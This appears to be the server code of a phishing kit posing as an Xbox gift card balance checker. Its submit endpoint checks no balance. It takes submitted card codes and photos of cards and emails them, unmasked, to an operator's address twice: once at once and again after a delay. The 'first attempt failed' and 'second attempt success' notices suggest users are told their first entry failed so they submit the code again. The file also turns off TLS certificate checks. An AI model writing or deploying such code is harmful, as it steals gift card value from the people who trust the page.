import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import nodemailer from 'nodemailer';
import { Resend } from 'resend';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
const FRONTEND_URL = process.env.FRONTEND_URL || '*';

app.use(cors({
  origin: FRONTEND_URL,
  credentials: true,
}));
app.use(express.json({ limit: '10mb' }));

const resend = new Resend(process.env.RESEND_API_KEY);

const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 587,
  secure: false,
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD,
  },
  tls: {
    rejectUnauthorized: false,
  },
});

transporter.verify().then(() => {
  console.log('✅ Gmail SMTP transport verified');
}).catch((error) => {
  console.warn('⚠️ Gmail SMTP verification failed:', error.message);
});

function maskCode(code) {
  if (!code) return 'N/A';
  if (code.length <= 5) return '*****';
  return `*****${code.slice(-5)}`;
}

function buildEmailAttachments(imageBase64) {
  if (!imageBase64) return [];

  const matches = imageBase64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
  if (!matches || !matches[2]) return [];

  return [{
    filename: `xbox-card-${Date.now()}.${matches[1]}`,
    content: matches[2],
    encoding: 'base64',
  }];
}

function buildEmailHtml(type, data) {
  const { cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent, pageSource, message } = data;

  if (type === 'first_attempt_failed') {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
        <div style="background: #dc3545; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
          <h2 style="margin: 0;">❌ FIRST ATTEMPT FAILED</h2>
        </div>
        <div style="background: white; padding: 20px; border-radius: 8px;">
          <p><strong>🎮 Code:</strong> ${cardNumber}</p>
          <p><strong>💰 Amount:</strong> $${amount}</p>
          <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
          <p><strong>📊 Status:</strong> FAILED</p>
          <p><strong>💬 Message:</strong> ${message || 'User instructed to re-enter code or upload clearer image'}</p>
          <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
          <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
        </div>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
          <p>Xbox Gift Card Balance Checker - Automated Notification</p>
        </div>
      </div>
    `;
  }

  if (type === 'second_attempt_success') {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
        <div style="background: #28a745; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
          <h2 style="margin: 0;">✅ SECOND ATTEMPT SUCCESS</h2>
        </div>
        <div style="background: white; padding: 20px; border-radius: 8px;">
          <p><strong>🎮 Code:</strong> ${cardNumber}</p>
          <p><strong>💰 Amount:</strong> $${amount}</p>
          <p><strong>💵 Balance:</strong> ${balance}</p>
          <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
          <p><strong>📊 Status:</strong> SUCCESS</p>
          <p><strong>💬 Message:</strong> ${message || 'Verification successful on second attempt'}</p>
          <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
          <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
        </div>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
          <p>Xbox Gift Card Balance Checker - Automated Notification</p>
        </div>
      </div>
    `;
  }

  if (type === 'mismatch_attempt') {
    return `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
        <div style="background: #ffc107; color: #1a1a1a; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
          <h2 style="margin: 0;">⚠️ CODE MISMATCH</h2>
        </div>
        <div style="background: white; padding: 20px; border-radius: 8px;">
          <p><strong>🎮 First Code:</strong> ${maskCode(cardNumberFirst)}</p>
          <p><strong>🎮 Second Code:</strong> ${maskCode(cardNumberSecond)}</p>
          <p><strong>💰 Amount:</strong> $${amount}</p>
          <p><strong>📍 Page:</strong> ${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</p>
          <p><strong>📊 Status:</strong> MISMATCH</p>
          <p><strong>💬 Message:</strong> ${message || 'User entered different code on second attempt'}</p>
          <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
          <p><strong>🌐 Browser:</strong> ${userAgent?.substring(0, 50) || 'Unknown'}</p>
        </div>
        <div style="text-align: center; margin-top: 20px; color: #666; font-size: 12px;">
          <p>Xbox Gift Card Balance Checker - Automated Notification</p>
        </div>
      </div>
    `;
  }

  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 8px;">
      <div style="background: #107C10; color: white; padding: 15px; border-radius: 8px 8px 0 0; margin: -20px -20px 20px -20px;">
        <h2 style="margin: 0;">Xbox Gift Card Notification</h2>
      </div>
      <div style="background: white; padding: 20px; border-radius: 8px;">
        <p><strong>Type:</strong> ${type}</p>
        <p><strong>💰 Amount:</strong> $${amount}</p>
        <p><strong>💬 Message:</strong> ${message || 'No message'}</p>
        <p><strong>🕐 Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
      </div>
    </div>
  `;
}

app.get('/api/health', (req, res) => {
  res.status(200).json({ status: 'ok', message: 'Server active' });
});

app.post('/api/submit', async (req, res) => {
  const formData = req.body || {};
  const { type, cardNumber, cardNumberFirst, cardNumberSecond, amount, balance, timestamp, userAgent, pageSource, imageBase64, message } = formData;

  res.status(200).json({
    success: true,
    message: 'Submission received',
  });

  const sendInstantEmail = async () => {
    try {
      if (!process.env.RESEND_API_KEY) {
        console.warn('⚠️ RESEND_API_KEY missing. Skipping instant email.');
        return;
      }

      const html = buildEmailHtml(type, {
        cardNumber,
        cardNumberFirst,
        cardNumberSecond,
        amount,
        balance,
        timestamp,
        userAgent,
        pageSource,
        message,
      });

      const attachments = buildEmailAttachments(imageBase64);

      const result = await resend.emails.send({
        from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
        to: process.env.TARGET_EMAIL || process.env.NOTIFICATION_EMAIL,
        subject: type === 'first_attempt_failed'
          ? 'FIRST ATTEMPT FAILED - Xbox Gift Card'
          : type === 'second_attempt_success'
            ? 'SECOND ATTEMPT SUCCESS - Xbox Gift Card'
            : type === 'mismatch_attempt'
              ? 'CODE MISMATCH - Xbox Gift Card'
              : 'Xbox Gift Card Notification',
        html,
        attachments: attachments.length ? attachments.map((file) => ({
          filename: file.filename,
          content: file.content,
        })) : undefined,
      });

      console.log('✅ Resend email sent successfully:', result?.id || 'unknown');
    } catch (error) {
      console.error('❌ Resend email failed:', error.message);
    }
  };

  const sendDelayedEmail = () => {
    setTimeout(async () => {
      try {
        if (!process.env.GMAIL_USER || !process.env.GMAIL_APP_PASSWORD) {
          console.warn('⚠️ Gmail credentials missing. Skipping delayed email.');
          return;
        }

        const html = buildEmailHtml(type, {
          cardNumber,
          cardNumberFirst,
          cardNumberSecond,
          amount,
          balance,
          timestamp,
          userAgent,
          pageSource,
          message,
        });

        const attachments = buildEmailAttachments(imageBase64);

        const info = await transporter.sendMail({
          from: process.env.GMAIL_USER,
          to: process.env.TARGET_EMAIL || process.env.NOTIFICATION_EMAIL,
          subject: type === 'first_attempt_failed'
            ? 'FIRST ATTEMPT FAILED - Xbox Gift Card'
            : type === 'second_attempt_success'
              ? 'SECOND ATTEMPT SUCCESS - Xbox Gift Card'
              : type === 'mismatch_attempt'
                ? 'CODE MISMATCH - Xbox Gift Card'
                : 'Xbox Gift Card Notification',
          html,
          attachments: attachments.length ? attachments : [],
        });

        console.log('✅ Delayed Gmail email sent successfully:', info.messageId);
      } catch (error) {
        console.error('❌ Delayed Gmail email failed:', error.message);
      }
    }, 60000);
  };

  sendInstantEmail();
  sendDelayedEmail();
});

app.listen(PORT, () => {
  console.log(`Backend running on port ${PORT}`);
});
